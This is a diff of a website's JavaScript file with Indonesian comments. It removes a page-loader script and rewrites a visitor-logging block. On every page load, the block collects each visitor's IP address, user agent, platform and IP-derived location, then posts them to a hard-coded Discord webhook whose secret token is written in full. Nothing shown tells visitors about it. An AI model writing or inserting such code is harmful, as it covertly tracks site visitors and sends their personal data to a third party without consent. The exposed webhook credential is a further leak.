@@ -89,75 +89,72 @@ document.addEventListener("DOMContentLoaded", function () {
 
 // Script Form-Kontak
 
-// Script Load Web
-	// Set Window Di-Atas
 
-window.onload = function() {
-    // Fungsi untuk scroll ke atas
-    setTimeout(function() {
-        window.scrollTo({ top: 0, left: 0, behavior: 'instant' });
-    }, 50); 
-
-    // Fungsi untuk fade out loader dengan penyesuaian delay
-    setTimeout(() => {
-        const loader = document.getElementById('loader');
-        if (loader) {
-            loader.classList.add('fade-out');
-        } else {
-            console.error('Loader element not found!');
-        }
-    }, 500); // Penambahan delay agar lebih lama jika perlu
-};
-// Script Load Web
 
 
 	
   // Script Log HWID, Device info, User Agent, dan IP Log
     fetch('https://api.ipify.org?format=json')
-  .then(response => response.json())
+  .then(response => {
+    if (!response.ok) {
+      throw new Error('Gagal mengambil IP');
+    }
+    return response.json();
+  })
   .then(data => {
     const ip = data.ip;
     const userAgent = navigator.userAgent;
     const device = navigator.platform;
     const date = new Date().toLocaleString();
+    console.log("IP:", ip); // Log IP
 
-    // Ambil lokasi, lalu kirim webhook
+    // Ambil lokasi berdasarkan IP
     fetch('https://ipapi.co/json/')
-      .then(res => res.json())
+      .then(res => {
+        if (!res.ok) {
+          throw new Error('Gagal mengambil lokasi');
+        }
+        return res.json();
+      })
       .then(locData => {
         const location = `${locData.city}, ${locData.region}, ${locData.country_name}`;
+        console.log("Lokasi:", location); // Log Lokasi
 
-        // Siapkan payload embed Discord
-        const webhookUrl = 'https://discord.com/api/webhooks/1365583624115847218/924teezrVY3kz-N1ogtljxXAa4Ef5GgvOUMJ3tSZxAiRQ4tQh6g7OINU57Jf1CfdZAb1';
-
+        // Siapkan payload embed untuk Discord
         const embed = {
-          embeds: [{
-            title: "WEB ACCESS LOG",
-            color: 15548997,
-            fields: [
-              { name: "IP Address", value: ip, inline: true },
-              { name: "Device", value: device, inline: true },
-              { name: "User Agent", value: userAgent, inline: false },
-              { name: "Location", value: location, inline: true },
-              { name: "Date", value: date, inline: true }
+          "embeds": [{
+            "title": "WEB ACCESS LOG",
+            "color": 3447003, // Warna Embed
+            "fields": [
+              { "name": "IP Address", "value": ip, "inline": true },
+              { "name": "Device", "value": device, "inline": true },
+              { "name": "User Agent", "value": userAgent, "inline": false },
+              { "name": "Location", "value": location, "inline": true },
+              { "name": "Date", "value": date, "inline": true }
             ],
-            footer: { text: "HWID Log" }
+            "footer": {
+              "text": "HWID Log"
+            }
           }]
         };
 
-        // Kirim ke Discord
+        // Kirim payload ke Discord
+        const webhookUrl = 'https://discord.com/api/webhooks/1365583624115847218/924teezrVY3kz-N1ogtljxXAa4Ef5GgvOUMJ3tSZxAiRQ4tQh6g7OINU57Jf1CfdZAb1';
+
         fetch(webhookUrl, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify(embed)
-        }).then(response => {
+        })
+        .then(response => {
           if (response.ok) {
             console.log('Log berhasil dikirim ke Discord');
           } else {
-            console.error('Gagal mengirim log ke Discord');
+            console.error('Gagal mengirim log ke Discord. Status:', response.status);
           }
-        }).catch(error => {
-          console.error('Fetch error:', error);
+        })
+        .catch(error => {
+          console.error('Error saat mengirim log:', error);
         });
       })
       .catch(error => {
